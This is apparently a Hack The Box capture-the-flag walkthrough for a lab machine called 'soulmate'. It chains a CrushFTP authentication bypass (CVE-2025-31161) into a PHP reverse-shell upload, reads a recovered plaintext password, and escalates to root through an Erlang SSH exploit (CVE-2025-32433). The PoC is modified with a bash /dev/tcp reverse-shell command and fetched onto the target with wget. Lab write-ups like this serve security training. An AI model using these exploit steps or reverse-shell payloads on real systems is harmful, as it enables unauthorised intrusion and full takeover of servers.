Target: 
  10.10.11.86 -- (Yours will be different)
  soulmate.htb

--Setup Target In Hosts
	echo -e "10.10.11.86\tsoulmate.htb" | sudo tee -a /etc/hosts > /dev/null

--Nmap--
	Starting with a port scan followed up with a versions/scripts scan
		nmap -sS -p- --min-rate=1000 -oN Recon/ports.nmap soulmate.htb
		nmap -sSVC -p 22,80 -oN Recon/versions.nmap soulmate.htb
	
--HTTP--
	I start by fuzzing for subdomains
		ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://soulmate.htb -H "HOST: FUZZ.soulmate.htb" -t 200
	I found a subdomain ftp. and added it to hosts
		echo -e "10.10.11.86\tftp.soulmate.htb" | sudo tee -a /etc/hosts > /dev/null
	
	There is a CrushFTP instance running, and after some research, I found a critical vulnerability CVE-2025-31161
	Using this PoC https://github.com/Immersive-Labs-Sec/CVE-2025-31161/tree/main, I created a new admin account
	Then I gave myself access to the app folder with upload permission
	
	I opened a netcat port on my host for the reverse shell
		nc -lvnp 1111
	Then uploaded the reverseShell.php into the app (Make sure you update the IP)
	and visited it through http://soulmate.htb/reverseShell.php 
	
--Initial to User Access
	I was able to find a plaintext password with this(note this is very manual and had a lot of results)
		grep --color=auto -rn "/" -ie "password\\|passwd" --exclude-dir={proc,sys,dev,run,/usr/lib/python3} 2>/dev/null
		(look in usr/local/lib/erlang_login/start.escript)

	Then I sshed into the Ben's account
		ssh ben@soulmate.htb
		HouseH0ldings998
	
--User to Root access
	Read the flag
		cat user.txt
	
	I looked up Erlang since it was a strange place to find the password. It turns out it has a critical vulnerability CVE-2025-32433
	It is for versions up to 25.3.2.20 and the host version is 15.2.5
	
	I downloaded this PoC https://github.com/platsecurity/CVE-2025-32433/blob/main/CVE-2025-32433.py
	I made a few changes to create a reverse shell instead
	Replace the command line in chan_req(line 108) with 
	command=f'os:cmd("bash -c \'bash -i >& /dev/tcp/[your ip]/1111 0>&1\'").'
	
	Host it with 
		python3 -m http.server 8000
	Then, on the target, download it with
		wget "http://[your ip]:8000/CVE-2025-32433.py"
	If you haven't already, close the previous netcat connection and open a new one
		nc -lvnp 1111
	Then, on the target run
		python3 CVE-2025-32433.py

--Root
	Read the flag
		cat root.txt
